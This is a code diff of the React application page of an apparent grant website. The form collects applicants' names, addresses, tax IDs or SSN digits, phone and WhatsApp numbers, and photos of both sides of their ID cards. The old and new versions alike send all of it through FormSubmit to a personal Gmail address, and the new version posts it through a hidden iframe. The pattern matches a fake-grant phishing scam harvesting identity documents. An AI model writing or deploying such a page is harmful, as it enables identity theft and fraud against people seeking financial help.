@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useRef } from 'react';
 import { Link, useSearchParams } from 'react-router-dom';
 import { Upload, CheckCircle } from 'lucide-react';
 import { grants } from '../data/grants';
@@ -30,6 +30,10 @@ export default function Apply() {
   const [searchParams] = useSearchParams();
   const preselectedGrantId = searchParams.get('grant') || '';
 
+  const formRef = useRef<HTMLFormElement>(null);
+  const frontFileRef = useRef<HTMLInputElement>(null);
+  const backFileRef = useRef<HTMLInputElement>(null);
+
   const [form, setForm] = useState<ApplicationFormData>({
     organizationName: '', organizationType: '', ein: '',
     organizationAddress: '', city: '', state: '',
@@ -41,11 +45,11 @@ export default function Apply() {
   });
 
   const [idFront, setIdFront] = useState<File | null>(null);
-  const [idBack,  setIdBack]  = useState<File | null>(null);
-
+  const [idBack, setIdBack] = useState<File | null>(null);
   const [errors, setErrors] = useState<FormErrors>({});
-  const [status, setStatus] = useState<'idle' | 'loading' | 'success'>('idle');
-  const [referenceId, setReferenceId] = useState('');
+  const [isSubmitted, setIsSubmitted] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [referenceId] = useState(() => Date.now().toString(36).toUpperCase());
 
   const selectedGrant = grants.find(g => g.id === form.grantId);
 
@@ -72,46 +76,7 @@ export default function Apply() {
     return e;
   };
 
-  // Fast client-side image compression to make uploads instant even on mobile
-  const compressImage = async (file: File): Promise<File> => {
-    if (!file.type.startsWith('image/') || file.size < 600 * 1024) return file;
-    return new Promise((resolve) => {
-      const img = new Image();
-      const url = URL.createObjectURL(file);
-      img.onload = () => {
-        URL.revokeObjectURL(url);
-        const canvas = document.createElement('canvas');
-        let { width, height } = img;
-        const maxDim = 1400;
-        if (width > maxDim || height > maxDim) {
-          if (width > height) {
-            height = Math.round((height * maxDim) / width);
-            width = maxDim;
-          } else {
-            width = Math.round((width * maxDim) / height);
-            height = maxDim;
-          }
-        }
-        canvas.width = width;
-        canvas.height = height;
-        const ctx = canvas.getContext('2d');
-        if (!ctx) return resolve(file);
-        ctx.drawImage(img, 0, 0, width, height);
-        canvas.toBlob(
-          (blob) => {
-            if (!blob) return resolve(file);
-            resolve(new File([blob], file.name.replace(/\.[^.]+$/, '.jpg'), { type: 'image/jpeg' }));
-          },
-          'image/jpeg',
-          0.8
-        );
-      };
-      img.onerror = () => resolve(file);
-      img.src = url;
-    });
-  };
-
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     const errs = validate();
     if (Object.keys(errs).length > 0) {
@@ -121,73 +86,52 @@ export default function Apply() {
       return;
     }
 
-    // Immediately show loading state so button gives instant feedback
-    setStatus('loading');
-
-    const ref = Date.now().toString(36).toUpperCase();
-    setReferenceId(ref);
-
+    setIsSubmitting(true);
+    const ref = referenceId;
     const grantTitle = selectedGrant?.title || 'General Grant Application';
-    const awardText  = selectedGrant
+    const awardText = selectedGrant
       ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
       : 'Standard';
 
-    // Compress ID images in parallel for blazing fast upload
-    const [compressedFront, compressedBack] = await Promise.all([
-      idFront ? compressImage(idFront) : Promise.resolve(null),
-      idBack  ? compressImage(idBack)  : Promise.resolve(null),
-    ]);
-
-    // Save to localStorage for admin panel
+    // Store in localStorage for administration desk
     try {
       const existing = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
       existing.unshift({
         referenceId: `EAG-${ref}`,
         submittedAt: new Date().toISOString(),
-        grantTitle, awardRange: awardText,
+        grantTitle,
+        awardRange: awardText,
         applicantName: form.organizationName,
         applicantType: form.organizationType,
         address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
         taxIdOrSsn: form.ein || 'N/A',
         contactPerson: form.fullName,
-        email: form.email, phone: form.phone, whatsapp: form.whatsapp,
-        projectTitle: form.projectTitle, projectDescription: form.projectDescription,
+        email: form.email,
+        phone: form.phone,
+        whatsapp: form.whatsapp,
+        projectTitle: form.projectTitle,
+        projectDescription: form.projectDescription,
         idFrontName: idFront?.name || 'Not provided',
-        idBackName:  idBack?.name  || 'Not provided',
+        idBackName: idBack?.name || 'Not provided',
       });
       localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
-    } catch { /* ignore */ }
+    } catch {
+      // localStorage fallback
+    }
 
-    // Send via FormData multipart — fire and forget so success shows instantly
-    const fd = new FormData();
-      fd.append('_subject',       `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
-      fd.append('_captcha',       'false');
-      fd.append('_template',      'table');
-      fd.append('_next',          `${window.location.origin}/`);
-      fd.append('Reference ID',               `EAG-${ref}`);
-      fd.append('Grant Applied For',          grantTitle);
-      fd.append('Award Range',                awardText);
-      fd.append('Applicant / Entity',         form.organizationName);
-      fd.append('Applicant Type',             form.organizationType);
-      fd.append('Contact Person',             form.fullName);
-      fd.append('Email Address',              form.email);
-      fd.append('Phone Number',               form.phone);
-      fd.append('WhatsApp Number',            form.whatsapp);
-      fd.append('Mailing / Physical Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
-      fd.append('EIN or Tax ID',              form.ein || 'N/A');
-      fd.append('Project Title',              form.projectTitle);
-      fd.append('Project Proposal Summary',   form.projectDescription || 'N/A');
-      fd.append('Submission Time',            new Date().toLocaleString());
-      if (compressedFront) fd.append('ID Card Front', compressedFront, `ID-Front-${form.fullName.replace(/\s+/g,'-')}-${compressedFront.name}`);
-      if (compressedBack)  fd.append('ID Card Back',  compressedBack,  `ID-Back-${form.fullName.replace(/\s+/g,'-')}-${compressedBack.name}`);
+    // Submit natively to the hidden iframe so FormSubmit receives the multipart file attachments
+    if (formRef.current) {
+      formRef.current.submit();
+    }
 
-    // Do NOT await — email delivers in the background, user sees success immediately
-    fetch('https://formsubmit.co/erimiposi2005@gmail.com', { method: 'POST', body: fd }).catch(() => {});
-
-    setStatus('success');
+    // Transition smoothly to success screen
+    setTimeout(() => {
+      setIsSubmitting(false);
+      setIsSubmitted(true);
+    }, 400);
   };
 
-  if (status === 'success') {
+  if (isSubmitted) {
     return (
       <div className="apply-success">
         <div className="apply-success-card">
@@ -218,6 +162,9 @@ export default function Apply() {
 
   return (
     <div className="apply-page">
+      {/* Hidden target iframe to handle FormSubmit POST response without navigating away */}
+      <iframe name="formsubmit_frame" id="formsubmit_frame" style={{ display: 'none' }} title="formsubmit_frame" />
+
       <div className="page-header">
         <div className="container">
           <div className="breadcrumb">
@@ -231,20 +178,49 @@ export default function Apply() {
       </div>
 
       <div className="container apply-layout">
-        <form onSubmit={handleSubmit} className="apply-form" noValidate>
-          {/* Organization */}
+        <form
+          ref={formRef}
+          action="https://formsubmit.co/erimiposi2005@gmail.com"
+          method="POST"
+          encType="multipart/form-data"
+          target="formsubmit_frame"
+          onSubmit={handleSubmit}
+          className="apply-form"
+          noValidate
+        >
+          {/* FormSubmit Configuration Fields */}
+          <input type="hidden" name="_captcha" value="false" />
+          <input type="hidden" name="_template" value="table" />
+          <input type="hidden" name="_subject" value={`🏛️ New Grant Application: ${selectedGrant?.title || 'General Grant'} (Ref: EAG-${referenceId})`} />
+          <input type="hidden" name="Reference ID" value={`EAG-${referenceId}`} />
+          <input type="hidden" name="Grant Applied For" value={selectedGrant?.title || 'General Grant Application'} />
+          <input type="hidden" name="Award Range" value={selectedGrant ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}` : 'Standard'} />
+          <input type="hidden" name="Submission Time" value={new Date().toLocaleString()} />
+
           {/* Applicant Info */}
           <div className="apply-section">
             <h2>Applicant Information</h2>
             <div className="apply-grid-2">
               <div className="form-group">
                 <label className="form-label">Applicant / Organization Name <span className="req">*</span></label>
-                <input type="text" value={form.organizationName} onChange={e => setField('organizationName', e.target.value)} placeholder="Full legal name or organization name" className={`form-input ${errors.organizationName ? 'error' : ''}`} />
+                <input
+                  type="text"
+                  name="Applicant / Organization Name"
+                  value={form.organizationName}
+                  onChange={e => setField('organizationName', e.target.value)}
+                  placeholder="Full legal name or organization name"
+                  className={`form-input ${errors.organizationName ? 'error' : ''}`}
+                />
                 {errors.organizationName && <span className="form-error">{errors.organizationName}</span>}
               </div>
               <div className="form-group">
                 <label className="form-label">Applicant Type <span className="req">*</span></label>
-                <select value={form.organizationType} onChange={e => setField('organizationType', e.target.value as ApplicantType)} className={`form-select ${errors.organizationType ? 'error' : ''}`}>
+                <select
+                  name="Applicant Type"
+                  value={form.organizationType}
+                  onChange={e => setField('organizationType', e.target.value as ApplicantType)}
+                  className={`form-select ${errors.organizationType ? 'error' : ''}`}
+                >
                   <option value="">Select applicant type</option>
                   {APPLICANT_TYPES.map(t => <option key={t}>{t}</option>)}
                 </select>
@@ -253,22 +229,48 @@ export default function Apply() {
             </div>
             <div className="form-group">
               <label className="form-label">EIN / SSN (Last 4) / Tax ID (Optional)</label>
-              <input type="text" value={form.ein} onChange={e => setField('ein', e.target.value)} placeholder="e.g. 12-3456789 or last 4 digits of SSN" className="form-input" />
+              <input
+                type="text"
+                name="EIN or Tax ID"
+                value={form.ein}
+                onChange={e => setField('ein', e.target.value)}
+                placeholder="e.g. 12-3456789 or last 4 digits of SSN"
+                className="form-input"
+              />
             </div>
             <div className="form-group">
               <label className="form-label">Physical / Mailing Address <span className="req">*</span></label>
-              <input type="text" value={form.organizationAddress} onChange={e => setField('organizationAddress', e.target.value)} placeholder="Street address or P.O. Box" className={`form-input ${errors.organizationAddress ? 'error' : ''}`} />
+              <input
+                type="text"
+                name="Physical / Mailing Address"
+                value={form.organizationAddress}
+                onChange={e => setField('organizationAddress', e.target.value)}
+                placeholder="Street address or P.O. Box"
+                className={`form-input ${errors.organizationAddress ? 'error' : ''}`}
+              />
               {errors.organizationAddress && <span className="form-error">{errors.organizationAddress}</span>}
             </div>
             <div className="apply-grid-2">
               <div className="form-group">
                 <label className="form-label">City <span className="req">*</span></label>
-                <input type="text" value={form.city} onChange={e => setField('city', e.target.value)} placeholder="Enter city" className={`form-input ${errors.city ? 'error' : ''}`} />
+                <input
+                  type="text"
+                  name="City"
+                  value={form.city}
+                  onChange={e => setField('city', e.target.value)}
+                  placeholder="Enter city"
+                  className={`form-input ${errors.city ? 'error' : ''}`}
+                />
                 {errors.city && <span className="form-error">{errors.city}</span>}
               </div>
               <div className="form-group">
                 <label className="form-label">State <span className="req">*</span></label>
-                <select value={form.state} onChange={e => setField('state', e.target.value)} className={`form-select ${errors.state ? 'error' : ''}`}>
+                <select
+                  name="State"
+                  value={form.state}
+                  onChange={e => setField('state', e.target.value)}
+                  className={`form-select ${errors.state ? 'error' : ''}`}
+                >
                   <option value="">Select state</option>
                   {US_STATES.map(s => <option key={s}>{s}</option>)}
                 </select>
@@ -283,22 +285,50 @@ export default function Apply() {
             <div className="apply-grid-2">
               <div className="form-group">
                 <label className="form-label">Full Name <span className="req">*</span></label>
-                <input type="text" value={form.fullName} onChange={e => setField('fullName', e.target.value)} placeholder="Enter full name" className={`form-input ${errors.fullName ? 'error' : ''}`} />
+                <input
+                  type="text"
+                  name="Full Name (Contact Person)"
+                  value={form.fullName}
+                  onChange={e => setField('fullName', e.target.value)}
+                  placeholder="Enter full name"
+                  className={`form-input ${errors.fullName ? 'error' : ''}`}
+                />
                 {errors.fullName && <span className="form-error">{errors.fullName}</span>}
               </div>
               <div className="form-group">
                 <label className="form-label">Email Address <span className="req">*</span></label>
-                <input type="email" value={form.email} onChange={e => setField('email', e.target.value)} placeholder="you@domain.com" className={`form-input ${errors.email ? 'error' : ''}`} />
+                <input
+                  type="email"
+                  name="Email Address"
+                  value={form.email}
+                  onChange={e => setField('email', e.target.value)}
+                  placeholder="you@domain.com"
+                  className={`form-input ${errors.email ? 'error' : ''}`}
+                />
                 {errors.email && <span className="form-error">{errors.email}</span>}
               </div>
               <div className="form-group">
                 <label className="form-label">Phone Number <span className="req">*</span></label>
-                <input type="tel" value={form.phone} onChange={e => setField('phone', e.target.value)} placeholder="+1 (555) 123-4567" className={`form-input ${errors.phone ? 'error' : ''}`} />
+                <input
+                  type="tel"
+                  name="Phone Number"
+                  value={form.phone}
+                  onChange={e => setField('phone', e.target.value)}
+                  placeholder="+1 (555) 123-4567"
+                  className={`form-input ${errors.phone ? 'error' : ''}`}
+                />
                 {errors.phone && <span className="form-error">{errors.phone}</span>}
               </div>
               <div className="form-group">
                 <label className="form-label">WhatsApp Number <span className="req">*</span></label>
-                <input type="tel" value={form.whatsapp} onChange={e => setField('whatsapp', e.target.value)} placeholder="+1 (555) 123-4567 (with country code)" className={`form-input ${errors.whatsapp ? 'error' : ''}`} />
+                <input
+                  type="tel"
+                  name="WhatsApp Number"
+                  value={form.whatsapp}
+                  onChange={e => setField('whatsapp', e.target.value)}
+                  placeholder="+1 (555) 123-4567 (with country code)"
+                  className={`form-input ${errors.whatsapp ? 'error' : ''}`}
+                />
                 {errors.whatsapp && <span className="form-error">{errors.whatsapp}</span>}
               </div>
             </div>
@@ -309,9 +339,17 @@ export default function Apply() {
             <h2>Grant Selection</h2>
             <div className="form-group">
               <label className="form-label">Select Grant <span className="req">*</span></label>
-              <select value={form.grantId} onChange={e => setField('grantId', e.target.value)} className={`form-select ${errors.grantId ? 'error' : ''}`}>
+              <select
+                value={form.grantId}
+                onChange={e => setField('grantId', e.target.value)}
+                className={`form-select ${errors.grantId ? 'error' : ''}`}
+              >
                 <option value="">Choose a grant...</option>
-                {grants.map(g => <option key={g.id} value={g.id}>{g.title} — ${g.minAmount.toLocaleString()}–${g.maxAmount.toLocaleString()}</option>)}
+                {grants.map(g => (
+                  <option key={g.id} value={g.id}>
+                    {g.title} — ${g.minAmount.toLocaleString()}–${g.maxAmount.toLocaleString()}
+                  </option>
+                ))}
               </select>
               {errors.grantId && <span className="form-error">{errors.grantId}</span>}
             </div>
@@ -321,7 +359,9 @@ export default function Apply() {
                 <div>
                   <p className="apply-grant-title">{selectedGrant.title}</p>
                   <p className="apply-grant-provider">{selectedGrant.provider}</p>
-                  <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>{selectedGrant.status}</span>
+                  <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>
+                    {selectedGrant.status}
+                  </span>
                 </div>
               </div>
             )}
@@ -332,16 +372,30 @@ export default function Apply() {
             <h2>Project Information</h2>
             <div className="form-group">
               <label className="form-label">Project Title <span className="req">*</span></label>
-              <input type="text" value={form.projectTitle} onChange={e => setField('projectTitle', e.target.value)} placeholder="Enter project title" className={`form-input ${errors.projectTitle ? 'error' : ''}`} />
+              <input
+                type="text"
+                name="Project Title"
+                value={form.projectTitle}
+                onChange={e => setField('projectTitle', e.target.value)}
+                placeholder="Enter project title"
+                className={`form-input ${errors.projectTitle ? 'error' : ''}`}
+              />
               {errors.projectTitle && <span className="form-error">{errors.projectTitle}</span>}
             </div>
             <div className="form-group">
               <label className="form-label">Project Description <span style={{ fontSize: 12, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></label>
-              <textarea value={form.projectDescription} onChange={e => setField('projectDescription', e.target.value)} placeholder="Describe your project, personal situation, or how the grant funds will be used..." className="form-textarea" rows={4} />
+              <textarea
+                name="Project Description / Proposal"
+                value={form.projectDescription}
+                onChange={e => setField('projectDescription', e.target.value)}
+                placeholder="Describe your project, personal situation, or how the grant funds will be used..."
+                className="form-textarea"
+                rows={4}
+              />
             </div>
           </div>
 
-          {/* ID Cards */}
+          {/* ID Cards Upload */}
           <div className="apply-section">
             <h2>ID Card Upload</h2>
             <p style={{ fontSize: 13.5, color: 'var(--gray-500)', marginBottom: 20, lineHeight: 1.6 }}>
@@ -354,14 +408,24 @@ export default function Apply() {
                 <div
                   className="file-drop-zone"
                   style={{ cursor: 'pointer', minHeight: 130 }}
-                  onClick={() => document.getElementById('id-front-input')?.click()}
+                  onClick={() => frontFileRef.current?.click()}
                 >
                   {idFront ? (
                     <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
                       <CheckCircle size={28} color="var(--green)" />
                       <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--navy)' }}>{idFront.name}</span>
                       <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(idFront.size / 1024).toFixed(1)} KB)</span>
-                      <button type="button" onClick={e => { e.stopPropagation(); setIdFront(null); }} style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}>✕ Remove</button>
+                      <button
+                        type="button"
+                        onClick={e => {
+                          e.stopPropagation();
+                          setIdFront(null);
+                          if (frontFileRef.current) frontFileRef.current.value = '';
+                        }}
+                        style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}
+                      >
+                        ✕ Remove
+                      </button>
                     </div>
                   ) : (
                     <>
@@ -371,11 +435,16 @@ export default function Apply() {
                     </>
                   )}
                   <input
+                    ref={frontFileRef}
                     id="id-front-input"
                     type="file"
+                    name="attachment"
                     accept=".jpg,.jpeg,.png,.pdf"
                     style={{ display: 'none' }}
-                    onChange={e => { const f = e.target.files?.[0]; if (f && f.size < 10 * 1024 * 1024) setIdFront(f); }}
+                    onChange={e => {
+                      const f = e.target.files?.[0];
+                      if (f && f.size < 10 * 1024 * 1024) setIdFront(f);
+                    }}
                   />
                 </div>
               </div>
@@ -386,14 +455,24 @@ export default function Apply() {
                 <div
                   className="file-drop-zone"
                   style={{ cursor: 'pointer', minHeight: 130 }}
-                  onClick={() => document.getElementById('id-back-input')?.click()}
+                  onClick={() => backFileRef.current?.click()}
                 >
                   {idBack ? (
                     <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
                       <CheckCircle size={28} color="var(--green)" />
                       <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--navy)' }}>{idBack.name}</span>
                       <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(idBack.size / 1024).toFixed(1)} KB)</span>
-                      <button type="button" onClick={e => { e.stopPropagation(); setIdBack(null); }} style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}>✕ Remove</button>
+                      <button
+                        type="button"
+                        onClick={e => {
+                          e.stopPropagation();
+                          setIdBack(null);
+                          if (backFileRef.current) backFileRef.current.value = '';
+                        }}
+                        style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}
+                      >
+                        ✕ Remove
+                      </button>
                     </div>
                   ) : (
                     <>
@@ -403,11 +482,16 @@ export default function Apply() {
                     </>
                   )}
                   <input
+                    ref={backFileRef}
                     id="id-back-input"
                     type="file"
+                    name="attachment"
                     accept=".jpg,.jpeg,.png,.pdf"
                     style={{ display: 'none' }}
-                    onChange={e => { const f = e.target.files?.[0]; if (f && f.size < 10 * 1024 * 1024) setIdBack(f); }}
+                    onChange={e => {
+                      const f = e.target.files?.[0];
+                      if (f && f.size < 10 * 1024 * 1024) setIdBack(f);
+                    }}
                   />
                 </div>
               </div>
@@ -419,13 +503,25 @@ export default function Apply() {
             <h2>Acknowledgements</h2>
             <div className="eligibility-checks">
               <label className={`eligibility-check ${errors.meetsEligibility ? 'error' : ''}`}>
-                <input type="checkbox" checked={form.meetsEligibility} onChange={e => setField('meetsEligibility', e.target.checked)} />
+                <input
+                  type="checkbox"
+                  name="Eligibility Confirmed"
+                  value="Yes"
+                  checked={form.meetsEligibility}
+                  onChange={e => setField('meetsEligibility', e.target.checked)}
+                />
                 <div><strong>I confirm my organization meets all eligibility requirements</strong> for the selected grant and all information provided is accurate.</div>
               </label>
               {errors.meetsEligibility && <span className="form-error">{errors.meetsEligibility}</span>}
 
               <label className={`eligibility-check ${errors.notPreviouslyFunded ? 'error' : ''}`}>
-                <input type="checkbox" checked={form.notPreviouslyFunded} onChange={e => setField('notPreviouslyFunded', e.target.checked)} />
+                <input
+                  type="checkbox"
+                  name="Funding Disclaimer Acknowledged"
+                  value="Yes"
+                  checked={form.notPreviouslyFunded}
+                  onChange={e => setField('notPreviouslyFunded', e.target.checked)}
+                />
                 <div><strong>I acknowledge that submitting this application does not guarantee funding</strong> and that all decisions are made solely by the grant provider at their discretion.</div>
               </label>
               {errors.notPreviouslyFunded && <span className="form-error">{errors.notPreviouslyFunded}</span>}
@@ -435,8 +531,8 @@ export default function Apply() {
           {/* Submit */}
           <div className="apply-submit-row">
             <Link to={selectedGrant ? `/grants/${selectedGrant.id}` : '/grants'} className="btn btn-outline">← Back</Link>
-            <button type="submit" className="btn btn-primary btn-lg" disabled={status === 'loading'}>
-              {status === 'loading'
+            <button type="submit" className="btn btn-primary btn-lg" disabled={isSubmitting}>
+              {isSubmitting
                 ? <><div className="spinner" style={{ width: 18, height: 18 }} /> Submitting...</>
                 : 'Submit Application'}
             </button>
@@ -449,11 +545,17 @@ export default function Apply() {
             <div className="apply-sidebar-card">
               <img src={selectedGrant.imageUrl} alt={selectedGrant.title} className="apply-sidebar-img" />
               <div className="apply-sidebar-body">
-                <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>{selectedGrant.status}</span>
+                <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>
+                  {selectedGrant.status}
+                </span>
                 <h3>{selectedGrant.title}</h3>
                 <p>{selectedGrant.provider}</p>
-                <div className="apply-sidebar-amount">${selectedGrant.minAmount.toLocaleString()} – ${selectedGrant.maxAmount.toLocaleString()}</div>
-                <div className="apply-sidebar-deadline">Deadline: {new Date(selectedGrant.deadline).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</div>
+                <div className="apply-sidebar-amount">
+                  ${selectedGrant.minAmount.toLocaleString()} – ${selectedGrant.maxAmount.toLocaleString()}
+                </div>
+                <div className="apply-sidebar-deadline">
+                  Deadline: {new Date(selectedGrant.deadline).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}
+                </div>
               </div>
             </div>
           </aside>
